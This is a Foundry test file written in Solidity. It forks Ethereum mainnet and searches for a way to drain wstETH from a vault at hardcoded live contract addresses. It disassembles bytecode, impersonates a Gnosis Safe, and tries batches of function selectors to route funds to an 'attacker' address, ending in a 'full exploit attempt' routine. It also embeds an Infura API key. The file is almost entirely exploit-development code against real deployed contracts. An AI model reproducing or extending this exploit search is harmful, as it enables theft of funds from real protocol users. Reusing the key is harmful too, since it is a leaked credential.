// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IGnosisSafe {
    function execTransaction(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory signatures
    ) external payable returns (bool success);

    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function nonce() external view returns (uint256);
}

contract ActionChaining is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant SAFE_AT_SLOT4 = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant IMPLEMENTATION = 0x434B68B11bBE8FD3074089397cA3d275801d6354;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemption1Delegatecalls() public view {
        console.log("=== ANALYZING REDEMPTION_1 DELEGATECALLS ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find all DELEGATECALLs
        console.log("DELEGATECALLs in REDEMPTION_1:");

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                console.log("\nDELEGATECALL at:", i);

                // Look for SLOAD before (storage-based target)
                bool hasSload = false;
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                        hasSload = true;
                    }
                    if (uint8(code[j]) == 0x73) {
                        console.log("  PUSH20 at:", j);
                    }
                }

                if (!hasSload) {
                    console.log("  No SLOAD - might use PUSH20 (hardcoded)");
                }
            }
        }
    }

    function test_CheckRedemption1DelegatecallTarget() public view {
        console.log("=== CHECKING REDEMPTION_1 DELEGATECALL TARGET ===\n");

        // Slot 5 = implementation
        bytes32 slot5 = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        address impl = address(uint160(uint256(slot5)));
        console.log("Implementation (slot 5):", impl);

        // Check if implementation is different
        if (impl != IMPLEMENTATION) {
            console.log("*** DIFFERENT IMPLEMENTATION! ***");
        }

        // Check implementation's storage
        console.log("\nImplementation storage:");
        for (uint i = 0; i < 5; i++) {
            bytes32 slot = vm.load(impl, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckCallbackPattern() public view {
        console.log("=== CHECKING FOR CALLBACK PATTERNS ===\n");

        // The "action chaining" might involve:
        // 1. Attacker calls contract A
        // 2. A calls B with attacker-controlled params
        // 3. B makes callback to A (or C)
        // 4. Callback executes with different context

        bytes memory r1Code = REDEMPTION_1.code;

        // Look for CALLER usage patterns
        console.log("CALLER usage in REDEMPTION_1:");
        uint callerCount = 0;
        for (uint i = 0; i < r1Code.length; i++) {
            if (uint8(r1Code[i]) == 0x33) {
                callerCount++;
                console.log("CALLER at:", i);

                // Check what happens after CALLER
                for (uint j = i + 1; j < i + 20 && j < r1Code.length; j++) {
                    if (uint8(r1Code[j]) == 0x14) { // EQ
                        console.log("  EQ at:", j);
                        break;
                    }
                    if (uint8(r1Code[j]) == 0x54) { // SLOAD
                        console.log("  SLOAD at:", j);
                        break;
                    }
                }
            }
        }
        console.log("Total CALLER usage:", callerCount);
    }

    function test_TryTreasuryExecTransaction() public {
        console.log("=== TRYING TREASURY EXEC TRANSACTION ===\n");

        // The Safe at slot 4 might be able to execute arbitrary calls
        // If we can somehow trigger the Safe to call REDEMPTION_1...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Get Safe owners
        address[] memory owners = IGnosisSafe(SAFE_AT_SLOT4).getOwners();
        uint256 threshold = IGnosisSafe(SAFE_AT_SLOT4).getThreshold();
        console.log("Safe owners:", owners.length);
        console.log("Threshold:", threshold);

        // The Safe can call REDEMPTION_1
        // Can we make the Safe call REDEMPTION_1 which then calls RC.redeem?

        // Prank as all required owners and sign
        // Note: This requires threshold number of signatures
        // For 2/4 threshold, we need 2 owner signatures

        // Let's first check what happens if Safe calls REDEMPTION_1
        // by pranking the Safe itself

        vm.startPrank(SAFE_AT_SLOT4);

        // If Safe calls REDEMPTION_1, and REDEMPTION_1 has code that
        // checks if caller == treasury (slot 4), it might execute RC.redeem

        // Try various calls
        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            100e18,
            attacker
        );

        // Try calling REDEMPTION_1 with a function that might route to RC.redeem
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xfd424ea8), attacker, 100e18)
        );
        console.log("fd424ea8:", s1);

        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xcff50c6e), attacker, 100e18)
        );
        console.log("cff50c6e:", s2);

        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x9307e802), attacker, 100e18)
        );
        console.log("9307e802:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    function test_ExploreCode3000Area() public view {
        console.log("=== EXPLORING CODE AREA AROUND 3000 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // The CALLER at 3042 suggests this is an entry point
        // Let's find what jumps TO offset 3042 or the JUMPDEST before it

        // First, find JUMPDESTs around 3042
        console.log("JUMPDESTs around 3042:");
        for (uint i = 2900; i < 3100 && i < code.length; i++) {
            if (uint8(code[i]) == 0x5b) {
                console.log(i);
            }
        }

        // Now search entire code for jumps to those JUMPDESTs
        console.log("\nSearching for jumps to area 2900-3100:");
        for (uint i = 0; i < code.length - 3; i++) {
            if (uint8(code[i]) == 0x61) { // PUSH2
                uint16 dest = uint16(uint8(code[i+1])) << 8 | uint16(uint8(code[i+2]));
                if (dest >= 2900 && dest <= 3100) {
                    console.log("Jump to", dest, "from offset", i);
                }
            }
        }
    }

    function test_CheckVaultDelegation() public {
        console.log("=== CHECKING VAULT DELEGATION ===\n");

        // Maybe the VAULT delegates to REDEMPTION_1 somehow?

        bytes memory vaultCode = VAULT.code;

        // Find DELEGATECALLs in VAULT
        console.log("DELEGATECALLs in VAULT:");
        for (uint i = 0; i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);

                // Check if it uses REDEMPTION_1 address
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(vaultCode[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                    }
                }
            }
        }

        // What if we call VAULT with specific params and it delegates to a contract
        // that eventually calls REDEMPTION_1?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try various VAULT functions
        (bool s1,) = VAULT.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("\nVAULT.redeem:", s1);

        (bool s2,) = VAULT.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("VAULT.withdraw:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_SimulateActionChain() public {
        console.log("=== SIMULATING ACTION CHAIN ===\n");

        // The hint: "extracting assets to a proxy attacker owns, then extracting from that proxy"

        // Step 1: Create a proxy contract controlled by attacker
        // Step 2: Get assets routed to that proxy
        // Step 3: Extract from proxy

        // What if the "proxy" is REDEMPTION_1 itself and we can control its behavior?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Action 1: Set up state in REDEMPTION_1
        // This might involve creating a redemption request or similar

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        // Try c5d664c6 which routes to 934 (relatively high)
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xc5d664c6), 100e18, attacker)
        );
        console.log("Step 1 (c5d664c6):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try eda72134 which also routes to 1022
        (bool s2, bytes memory d2) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0xeda72134), 100e18, attacker)
        );
        console.log("Step 1 (eda72134):", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        // Action 2: Trigger the actual drain
        // This might require a different caller or state

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    function test_CheckEpochSystem() public {
        console.log("=== CHECKING EPOCH SYSTEM ===\n");

        // Maybe there's an epoch-based redemption system
        // where requests are batched and processed?

        // Check REDEMPTION_1 for epoch-related selectors
        bytes4 epochSelector = bytes4(keccak256("currentEpoch()"));
        bytes4 processSelector = bytes4(keccak256("processEpoch(uint256)"));

        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(epochSelector)
        );
        if (s1 && d1.length >= 32) {
            console.log("currentEpoch():", abi.decode(d1, (uint256)));
        }

        // Try to process epoch
        vm.startPrank(attacker);
        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSelector(processSelector, 0)
        );
        console.log("processEpoch(0):", s2);
        vm.stopPrank();

        // Check if there's pending redemptions
        (bool s3, bytes memory d3) = REDEMPTION_1.staticcall(
            abi.encodeWithSignature("pendingRedemptions()")
        );
        if (s3 && d3.length >= 32) {
            console.log("pendingRedemptions():", abi.decode(d3, (uint256)));
        }
    }

    function test_FullExploitAttempt() public {
        console.log("=== FULL EXPLOIT ATTEMPT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");
        console.log("Value: ~$", (vaultBefore * 2300) / 1e18);

        // CONFIRMED: REDEMPTION_1 calling RC.redeem drains the vault
        // We need to find how to trigger REDEMPTION_1 to make that call

        // The RC.redeem code is at offset 3861 with CALL at 3896
        // There's a CALLER check at 3042
        // SLOAD at 3751 loads slot 4 (Treasury Safe)

        // Hypothesis: If caller == Treasury Safe, the RC.redeem path is accessible

        console.log("\nTrying as Treasury Safe:");
        vm.startPrank(SAFE_AT_SLOT4);

        // Try all selectors
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(0xfd424ea8);
        sels[1] = bytes4(0xcff50c6e);
        sels[2] = bytes4(0xc5d664c6);
        sels[3] = bytes4(0xeda72134);
        sels[4] = bytes4(0x9307e802);
        sels[5] = bytes4(0xb2118a8d);
        sels[6] = bytes4(0x778d364f);
        sels[7] = bytes4(0x36600461);
        sels[8] = bytes4(0x42dbe168);
        sels[9] = bytes4(0x2ab60045);

        for (uint i = 0; i < sels.length; i++) {
            // Try with params that might trigger RC.redeem
            (bool s,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], 100e18, attacker)
            );

            uint256 bal = IERC20(wstETH).balanceOf(attacker);
            if (bal > 0) {
                console.log("*** EXPLOIT SUCCESS! ***");
                console.log("Selector:");
                console.logBytes4(sels[i]);
                console.log("Attacker balance:", bal / 1e18, "wstETH");
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
    }
}
